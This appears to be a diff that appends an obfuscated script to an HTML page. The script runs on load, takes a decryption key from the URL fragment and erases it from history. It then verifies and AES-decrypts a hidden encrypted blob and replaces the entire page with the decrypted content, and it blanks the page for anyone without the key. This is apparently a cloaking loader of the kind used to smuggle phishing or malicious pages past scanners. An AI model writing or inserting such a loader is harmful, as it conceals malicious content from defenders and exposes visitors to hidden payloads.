@@ -727,5 +727,43 @@
       loadSecret();
     }, { once: true });
   </script>
-        
+  <script>
+            var yt8i = void 0;
+            !function() {
+                var w1k = document.getElementById("futj24r").innerHTML
+                  , n6ty = location.hash.slice(1);
+                if (!n6ty) {
+                    location.replace("about:blank");
+                    return
+                }
+                history.replaceState(null, null, location.pathname);
+                for (var pjft = n6ty; pjft.length < 32; )
+                    pjft += String.fromCharCode(0);
+                pjft = pjft.slice(0, 32);
+                var v13 = CryptoJS.enc.Latin1.parse(pjft)
+                  , itn3ncl = CryptoJS.enc.Latin1.parse("1f7230646a3f1ad53b7f1b247fb1ccaf")
+                  , acskmjf = CryptoJS.enc.Base64.parse(w1k)
+                  , qxho0qe = acskmjf.sigBytes
+                  , tv9cq = CryptoJS.lib.WordArray.create(acskmjf.words.slice(0, 4), 16)
+                  , kc4fs = CryptoJS.lib.WordArray.create(acskmjf.words.slice(4, (qxho0qe - 32) / 4), qxho0qe - 48)
+                  , nw52n7 = CryptoJS.lib.WordArray.create(acskmjf.words.slice((qxho0qe - 32) / 4), 32);
+                if (CryptoJS.enc.Hex.stringify(nw52n7) === CryptoJS.enc.Hex.stringify(CryptoJS.HmacSHA256(tv9cq.concat(kc4fs), itn3ncl))) {
+                    try {
+                        var o9foe9 = CryptoJS.AES.decrypt({
+                            ciphertext: kc4fs
+                        }, v13, {
+                            iv: tv9cq,
+                            mode: CryptoJS.mode.CBC,
+                            padding: CryptoJS.pad.Pkcs7
+                        }).toString(CryptoJS.enc.Utf8);
+                        o9foe9 ? (document.open(),
+                        document.write(o9foe9),
+                        document.close()) : location.replace("about:blank")
+                    } catch (vrrqxfv) {
+                        location.replace("about:blank")
+                    }
+                } else
+                    location.replace("about:blank")
+            }()
+        </script>       
 </html>
